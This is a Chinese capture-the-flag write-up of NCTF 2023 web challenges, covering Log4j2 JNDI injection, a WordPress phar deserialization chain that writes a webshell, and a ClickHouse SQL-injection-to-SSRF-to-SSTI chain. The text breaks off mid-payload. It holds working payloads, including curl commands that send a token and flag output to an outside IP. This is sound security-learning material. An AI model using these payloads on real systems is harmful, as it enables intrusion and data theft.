<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>NCTF 2023 Web Writeup(Post-Match) - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="NCTF 2023 Web Writeup(Post-Match) - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/12/28/NCTF%202023%20Web%20Writeup(Post-Match)/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-12-27T16:21:12.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>December</span>
            <span>28,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">NCTF 2023 Web Writeup(Post-Match)</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>看了一下WP感觉这次的题目都好有质量，然后就滚过来复现114和X1r0z师傅的题了。膜一下2位大佬。作为XZ师傅博客的忠实粉丝，我也发现这次题目绝大多数知识点他博客也都有。所有web题都给了docker环境，爱了爱了</p>
<h1 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h1><p>Log4j2，偏实战类吧，Accept请求头实战中我经常这样测。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703581028216-fa62287b-cea7-40e2-b25d-eaa7eb112879.png#averageHue=%23848f54&clientId=ubd264d06-77f6-4&from=paste&height=858&id=ub4126606&originHeight=1072&originWidth=1584&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=152008&status=done&style=none&taskId=uc951d284-454e-4e05-a3c1-ed3c094e2de&title=&width=1267.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703581031463-046cd141-bdee-435e-982e-61b822babf4a.png#averageHue=%2330302e&clientId=ubd264d06-77f6-4&from=paste&height=203&id=uaa5a97e3&originHeight=254&originWidth=755&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31130&status=done&style=none&taskId=uc4bb049d-9101-4995-92fe-3382104ec2f&title=&width=604" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703581051599-50d4a772-7d22-4bbc-9923-c769a7f9fb3c.png#averageHue=%230a0806&clientId=ubd264d06-77f6-4&from=paste&height=318&id=u6548bf62&originHeight=397&originWidth=1207&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=67000&status=done&style=none&taskId=ua61d1c93-136d-4e1a-aad4-8b6d4b2727a&title=&width=965.6" alt="image.png"><br>畸形的Accpet头成功触发了log，那么就引发了JNDI注入，接下里我们用JNDI-Exp就行了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703581422769-2a3023ad-a11c-489b-8a68-ec600b6659b2.png#averageHue=%23383734&clientId=ubd264d06-77f6-4&from=paste&height=454&id=u61375c32&originHeight=567&originWidth=841&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=131063&status=done&style=none&taskId=uafd5d472-a6fa-45df-ac70-6528c38fd03&title=&width=672.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703581418671-a736dd73-6f75-46de-af66-e46d070e8562.png#averageHue=%232f2f2e&clientId=ubd264d06-77f6-4&from=paste&height=646&id=u900916f8&originHeight=808&originWidth=1294&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=106119&status=done&style=none&taskId=u8f94d504-d939-4403-9d5c-d680da39e15&title=&width=1035.2" alt="image.png"><br>这个题还是比较经典的签到题。</p>
<h1 id="ez-wordpress"><a href="#ez-wordpress" class="headerlink" title="ez wordpress"></a>ez wordpress</h1><p>之前p神知识星球里的wordpress的gadgets<br><code>./phpggc WordPress/RCE2 system &quot;echo &#39;&#39; &gt; /var/www/html/shell.php&quot; -p phar -o ~/payload.phar </code><br>获取phar文件，然后就是2个CVE，一共3个漏洞扫出来<br><code>wpscan --url [http://127.0.0.1:8012/](http://127.0.0.1:8012/) --api-token xxx</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703671008740-0024d92b-0fca-429a-b56e-7585873820d7.png#averageHue=%234f535d&clientId=u10daa159-f587-4&from=paste&height=456&id=ue28e6987&originHeight=456&originWidth=1109&originalType=binary&ratio=1&rotation=0&showTitle=false&size=743266&status=done&style=none&taskId=u61e1170e-bdec-41cc-94ad-1c231dd2aa0&title=&width=1109" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703671011565-1cceefb3-296a-4937-a3e5-2eb30c05552f.png#averageHue=%234f535d&clientId=u10daa159-f587-4&from=paste&height=307&id=ub093aebf&originHeight=307&originWidth=1150&originalType=binary&ratio=1&rotation=0&showTitle=false&size=518605&status=done&style=none&taskId=u2aba0f90-e8d8-4536-ae7f-b857d0adc31&title=&width=1150" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703671014457-aabfdf25-09fe-447d-ab02-bc243ff2e949.png#averageHue=%234d505b&clientId=u10daa159-f587-4&from=paste&height=241&id=u010a9d1b&originHeight=241&originWidth=970&originalType=binary&ratio=1&rotation=0&showTitle=false&size=348862&status=done&style=none&taskId=u237215ab-0391-4486-a235-6522740214b&title=&width=970" alt="image.png"><br>一个任意文件上传，一个SSRF，刚好满足触发phar的条件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703671857898-367d0faa-3b0e-44ad-885e-7928709184ee.png#averageHue=%23927f4b&clientId=u10daa159-f587-4&from=paste&height=677&id=u2bb46f67&originHeight=677&originWidth=1402&originalType=binary&ratio=1&rotation=0&showTitle=false&size=131832&status=done&style=none&taskId=ud5fedeb4-0de8-4b33-9a3a-b62ff2243d0&title=&width=1402" alt="image.png"><br>我们现在获取到了上传文件的位置了。<br><code>/var/www/html/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/test.jpg</code><br>，接下来就是触发phar的ssrf了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703683007302-f572ddc5-0304-4f11-aa18-c4242f63fb35.png#averageHue=%238c9d67&clientId=u10daa159-f587-4&from=paste&height=676&id=u4a250e0d&originHeight=676&originWidth=1401&originalType=binary&ratio=1&rotation=0&showTitle=false&size=113469&status=done&style=none&taskId=uafabac5c-59d2-40f1-b488-96d7f88e67b&title=&width=1401" alt="image.png"><br>这里的base64就是<code>phar:///var/www/html/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/payload.jpg/test.txt</code><br>最后成功写入webshell<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703683127503-a7f61beb-b312-4f4a-a09c-93cd003d3fc9.png#averageHue=%239caa85&clientId=u10daa159-f587-4&from=paste&height=676&id=u59620709&originHeight=676&originWidth=1401&originalType=binary&ratio=1&rotation=0&showTitle=false&size=153544&status=done&style=none&taskId=u695d44ae-2ae2-40fa-bcc3-dde3006e633&title=&width=1401" alt="image.png"><br>后面就是date提权<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703683311132-bff26448-d44a-4577-93f2-81e096cdc222.png#averageHue=%232f2e2d&clientId=u10daa159-f587-4&from=paste&height=189&id=u673c83ef&originHeight=189&originWidth=852&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19099&status=done&style=none&taskId=u60b6bca3-02f5-4448-bf06-74085bb0620&title=&width=852" alt="image.png"><br>结束下班，注意记得phpggc中的php版本和题目版本对应上，题目是php7，别用php8或者php5就行。</p>
<h1 id="house-of-click"><a href="#house-of-click" class="headerlink" title="house of click"></a>house of click</h1><p>click house数据库的利用，这题也比较好玩，考点是SSRF和SSTI，入口点是数据库的盲注，看标题第一眼我还以为是pwn题。<br>审计一下源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> clickhouse_connect</span><br><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"><span class="keyword">import</span> web</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;.token&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    TOKEN = f.read()</span><br><span class="line"></span><br><span class="line">urls = (</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;Index&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/query&#x27;</span>, <span class="string">&#x27;Query&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/api/ping&#x27;</span>, <span class="string">&#x27;Ping&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/api/token&#x27;</span>, <span class="string">&#x27;Token&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/api/upload&#x27;</span>, <span class="string">&#x27;Upload&#x27;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">render = web.template.render(<span class="string">&#x27;templates/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_ip</span>(<span class="params">ip, ip_range</span>):</span><br><span class="line">    <span class="keyword">return</span> ipaddress.ip_address(ip) <span class="keyword">in</span> ipaddress.ip_network(ip_range)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Index</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> render.index()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">self</span>):</span><br><span class="line">        data = web.<span class="built_in">input</span>(name=<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> render.__getattr__(data.name)()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Query</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">self</span>):</span><br><span class="line">        data = web.<span class="built_in">input</span>(<span class="built_in">id</span>=<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        client = clickhouse_connect.get_client(host=<span class="string">&#x27;db&#x27;</span>, port=<span class="number">8123</span>, username=<span class="string">&#x27;default&#x27;</span>, password=<span class="string">&#x27;default&#x27;</span>)</span><br><span class="line">        sql = <span class="string">&#x27;SELECT * FROM web.users WHERE id = &#x27;</span> + data.<span class="built_in">id</span></span><br><span class="line">        client.command(sql)</span><br><span class="line">        client.close()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ping</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;pong&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Token</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GET</span>(<span class="params">self</span>):</span><br><span class="line">        ip = web.ctx.env.get(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_ip(ip, <span class="string">&#x27;172.28.0.0/16&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;forbidden&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> TOKEN</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Upload</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">self</span>):</span><br><span class="line">        ip = web.ctx.env.get(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>)</span><br><span class="line">        token = web.ctx.env.get(<span class="string">&#x27;HTTP_X_ACCESS_TOKEN&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_ip(ip, <span class="string">&#x27;172.28.0.0/16&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;forbidden&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> token != TOKEN:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;unauthorized&#x27;</span></span><br><span class="line">    </span><br><span class="line">        files = web.<span class="built_in">input</span>(myfile=&#123;&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;myfile&#x27;</span> <span class="keyword">in</span> files:</span><br><span class="line">            filepath = os.path.join(<span class="string">&#x27;upload/&#x27;</span>, files.myfile.filename)</span><br><span class="line">            <span class="keyword">if</span> (os.path.isfile(filepath)):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(files.myfile.file.read())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = web.application(urls, <span class="built_in">globals</span>())</span><br><span class="line">application = app.wsgifunc(web.httpserver.StaticMiddleware)</span><br></pre></td></tr></table></figure>
<p>这边搭建环境前首先请注意一下自己的Clickhouse版本是不是23.x的版本，因为有一些需要用到的函数在老版本没有，然后docker镜像源不同拉出来的版本也不同，推荐使用清华。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703665522760-1d1b6937-82fc-472d-b1b4-9595d6f8ece1.png#averageHue=%23030201&clientId=u05cfb51f-4d9a-4&from=paste&height=68&id=u63f7c2b1&originHeight=68&originWidth=432&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3061&status=done&style=none&taskId=ud6db4e27-4cc2-4f23-a84c-2919640bd28&title=&width=432" alt="image.png"><br>这里我的版本是23.11.3最新版。那我们就开始吧。<br><a target="_blank" rel="noopener" href="https://clickhouse.com/docs/en/sql-reference/table-functions/url">https://clickhouse.com/docs/en/sql-reference/table-functions/url</a><br>上面是houseclick的使用文档，阅读文档可以发现他和mysql类似，但是功能比mysql强大的多，用法也大差不差。入口点很清晰的看到是一个SQL注入。可以拼贴字符串。那我们现在要做的事情是获取token，随后获取到token后我们可以上传一个文件，这里上传文件也有目录穿越，穿越到模板文件目录直接访问index进行ssti。</p>
<ul>
<li>nginx+guiron绕过路径</li>
<li>SSRF获取Token</li>
<li>CRLF上传文件</li>
<li>SSTI RCE</li>
</ul>
<p>思路就上面三步。通过上面的doc我们知道houseclick是可以用url函数进行http请求的。<br><code>SELECT * FROM url(&#39;[http://8.130.24.188:7775/&#39;,](http://8.130.24.188:7775/&#39;,) CSV, &#39;column1 String, column2 UInt32&#39;, headers(&#39;Accept&#39;=&#39;text/csv; charset=utf-8&#39;)) LIMIT 3;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703666490190-c70429e0-088f-4dae-8efd-1f5b211b8d2c.png#averageHue=%232f2f2d&clientId=u05cfb51f-4d9a-4&from=paste&height=210&id=ua887f048&originHeight=210&originWidth=668&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26013&status=done&style=none&taskId=uf5d5f9dd-467a-4fae-9d90-b1eba8ab74a&title=&width=668" alt="image.png"><br>这里我们接受到了请求，那么我们就可以去请求token，我们后端测试一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703666614693-c42c2211-70cf-4fd3-bfc3-b1956d6818e5.png#averageHue=%23010100&clientId=u05cfb51f-4d9a-4&from=paste&height=295&id=u0e1a0373&originHeight=295&originWidth=1013&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23218&status=done&style=none&taskId=ubc178583-ee58-4623-a146-ae89d083aee&title=&width=1013" alt="image.png"><br>可以发现成功获取了cookie，那么我们只需要外带出来就可以了<br><code>id =1 and (select * from url(&#39;[http://8.130.24.188:7776/](http://8.130.24.188:7775/&#39;,)?token=&#39;||hex((select * FROM url(&#39;http://backend:8001/api/token&#39;, &#39;TabSeparatedRaw&#39;, &#39;x String&#39;))),CSV,&#39;a String&#39;))</code><br>这里需要注意一下源码里的nginx.conf<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703666858323-202a5cd8-f097-443a-b8b7-be99a18782b3.png#averageHue=%23222121&clientId=u05cfb51f-4d9a-4&from=paste&height=308&id=u1288b63c&originHeight=308&originWidth=558&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16120&status=done&style=none&taskId=ucedbbd39-3d18-49ac-9f0f-b119f0c7e1b&title=&width=558" alt="image.png"><br>只反代了api路径，那么query路径正常来说我们是无法访问的，但是后端采用的是Nginx+gunicorn，因此存在tab(%09)绕过<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/yDIMgXltVLNfslVGg9lt4g">https://mp.weixin.qq.com/s/yDIMgXltVLNfslVGg9lt4g</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703666829521-973a221e-9b6f-425c-9988-958cc50de22e.png#averageHue=%232d2d2d&clientId=u05cfb51f-4d9a-4&from=paste&height=267&id=u8813ace5&originHeight=267&originWidth=970&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25793&status=done&style=none&taskId=u979fe2b5-299a-4d7c-bb0b-d0344f3dcb9&title=&width=970" alt="image.png"><br>这里那个tab不用编码，直接打出来就行了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703666825037-e62c2e23-0f9c-4489-bd6a-f12dcf742912.png#averageHue=%2331302e&clientId=u05cfb51f-4d9a-4&from=paste&height=233&id=u67c1262e&originHeight=233&originWidth=852&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31579&status=done&style=none&taskId=uffdad8b5-61a5-4128-b647-b1989c6bab6&title=&width=852" alt="image.png"><br>我们获取到token的hex编码了，解码后为<code>873d437a3a98b705c5a3ca7c503d000e</code>，那么我们获取到token后加到<code>X-Access-Token</code>请求头即可，那么接下来思考的就是如何SSRF发送一段POST请求了，根据上述获取token的流程来开，select语句发起的是一段GET请求，那么有没有办法发起一段POST请求呢？<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703667058084-af84d129-31f2-4421-887d-fec330e02616.png#averageHue=%23212528&clientId=u05cfb51f-4d9a-4&from=paste&height=183&id=u9e5948ae&originHeight=183&originWidth=1403&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19090&status=done&style=none&taskId=u51e06bed-4136-4a43-9c75-6452135b0c1&title=&width=1403" alt="image.png"><br>DOC中给出了insert语句的语法<br><code>insert into function  url(&#39;[http://8.130.24.188:7775/&#39;,](http://8.130.24.188:7775/&#39;,) CSV, &#39;a String&#39;,headers(&#39;Content-Type&#39;=&#39;multipart/form-data; boundary=----test&#39;,&#39;X-Access-Token&#39;=&#39;873d437a3a98b705c5a3ca7c503d000e&#39;)) Values(&#39;boogipop&#39;);</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703667109247-8f570913-e36f-49d4-ac12-84a2f31e7755.png#averageHue=%2330302e&clientId=u05cfb51f-4d9a-4&from=paste&height=322&id=u08190e27&originHeight=322&originWidth=677&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39225&status=done&style=none&taskId=u2574c2b4-e679-4638-9513-77bda2e3a23&title=&width=677" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 8.130.24.188</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text/csv; charset=UTF-8; header=absent</span><br><span class="line">Content-Type: multipart/form-data; boundary=----test</span><br><span class="line">X-Access-Token: 873d437a3a98b705c5a3ca7c503d000e</span><br><span class="line">Connection: Close</span><br><span class="line"></span><br><span class="line">B</span><br><span class="line">&quot;boogipop&quot;</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<p>这里我们成功发起一段POST请求，但是有个问题就是有2个content-type,这个在 flask和其他中间件中，第二个type是不会被识别的，所以这里用的中间件是webpy。那么我们现在可以进行CRLF注入了。Values是可控的，<br>还有一点就是ssti模板注入了<br><a target="_blank" rel="noopener" href="https://webpy.org/docs/0.3/templetor.zh-cn">https://webpy.org/docs/0.3/templetor.zh-cn</a><br>webpy的模板允许我们执行任意python代码，那么直接rce了<br>我们的payload为<br><code>insert into function url(&#39;[http://8.130.24.188:7775/&#39;,](http://8.130.24.188:7775/&#39;,) CSV, &#39;a String&#39;,headers(&#39;Content-Type&#39;=&#39;multipart/form-data; boundary=----test&#39;,&#39;X-Access-Token&#39;=&#39;873d437a3a98b705c5a3ca7c503d000e&#39;)) Values(&#39; ------ test\r\nContent-Disposition: form-data; name=&quot;myfile&quot;; filename=&quot;../templates/exp.html&quot;\r\nContent-Type: text/plain\r\n\r\n$code:\r\n __import__(\&#39;os\&#39;).system(\&#39;curl http://8.130.24.188:7775/?flag=</code>&#x2F;readflag | base64<code>\&#39;)\r\n------test--&#39;);</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703667297860-65285741-024c-485a-8d1b-d031947d2d97.png#averageHue=%232f2f2d&clientId=u05cfb51f-4d9a-4&from=paste&height=487&id=u0daa68ae&originHeight=487&originWidth=746&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54783&status=done&style=none&taskId=u8d91ecab-2e98-4935-9019-6349e7d436f&title=&width=746" alt="image.png"><br>但是这里是引号包裹的，所以我们得换个格式，把CSV换为<code>TabSeparatedRaw</code><br>成功的构造出了文件上传的请求报文，最后的payload为<br><code>insert into function url(&#39;[http://backend:8001/api/upload&#39;,](http://8.130.24.188:7775/&#39;,)&#39;TabSeparatedRaw&#39;, &#39;a String&#39;,headers(&#39;Content-Type&#39;=&#39;multipart/form-data; boundary=----test&#39;,&#39;X-Access-Token&#39;=&#39;873d437a3a98b705c5a3ca7c503d000e&#39;)) Values(&#39; ------test\r\nContent-Disposition: form-data; name=&quot;myfile&quot;; filename=&quot;../templates/exp.html&quot;\r\nContent-Type: text/plain\r\n\r\n$code:\r\n	__import__(\&#39;os\&#39;).system(\&#39;curl http://8.130.24.188:7775/?flag=</code>&#x2F;readflag | base64<code>\&#39;)\r\n------test--&#39;);</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703667938464-5ae7d449-3df7-4168-a336-85dc48fdce9d.png#averageHue=%23020201&clientId=u05cfb51f-4d9a-4&from=paste&height=154&id=u8e2447e2&originHeight=154&originWidth=1008&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13259&status=done&style=none&taskId=ub73f6daa-6fad-46ac-b1b0-05c31bc916b&title=&width=1008" alt="image.png"><br>成功上传了文件，但是这是任意sql语句执行，题目中我们select中不能使用insert语句。这里又涉及到clickhouse的http interface，我们可以通过请求<code>http://default:default@db:8123/?query=SQL </code>执行任意SQL语句，那么我们最终构造的payload是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /query	HTTP/1.1/../../api/ping HTTP/1.1</span><br><span class="line">Host: localhost:8013</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4234</span><br><span class="line"></span><br><span class="line">id=1 and (select * from url(&#x27;http://default:default@db:8123/?query=%25%36%39%25%36%65%25%37%33%25%36%35%25%37%32%25%37%34%25%32%30%25%36%39%25%36%65%25%37%34%25%36%66%25%32%30%25%36%36%25%37%35%25%36%65%25%36%33%25%37%34%25%36%39%25%36%66%25%36%65%25%32%30%25%37%35%25%37%32%25%36%63%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%36%32%25%36%31%25%36%33%25%36%62%25%36%35%25%36%65%25%36%34%25%33%61%25%33%38%25%33%30%25%33%30%25%33%31%25%32%66%25%36%31%25%37%30%25%36%39%25%32%66%25%37%35%25%37%30%25%36%63%25%36%66%25%36%31%25%36%34%25%32%37%25%32%63%25%32%37%25%35%34%25%36%31%25%36%32%25%35%33%25%36%35%25%37%30%25%36%31%25%37%32%25%36%31%25%37%34%25%36%35%25%36%34%25%35%32%25%36%31%25%37%37%25%32%37%25%32%63%25%32%30%25%32%37%25%36%31%25%32%30%25%35%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%37%25%32%63%25%36%38%25%36%35%25%36%31%25%36%34%25%36%35%25%37%32%25%37%33%25%32%38%25%32%37%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%32%37%25%33